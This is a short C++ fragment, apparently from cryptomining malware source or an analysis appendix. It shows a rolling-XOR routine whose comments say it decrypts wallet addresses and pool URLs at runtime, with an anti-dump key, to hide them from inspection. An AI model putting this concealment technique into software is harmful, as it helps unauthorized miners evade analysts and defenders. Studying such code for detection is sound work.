// B.2 RUNTIME XOR STRING DECRYPTION
//     Wallet addresses and pool URLs stored encrypted
//     Key derived from process creation time (anti-dump)
// -------------------------------------------------------
std::string XorDecrypt(const std::vector<uint8_t>& cipher, uint8_t key) {
    std::string result(cipher.size(), 0);
    for (size_t i = 0; i < cipher.size(); i++)
        result[i] = (char)(cipher[i] ^ (key + (uint8_t)i));
    return result;
}

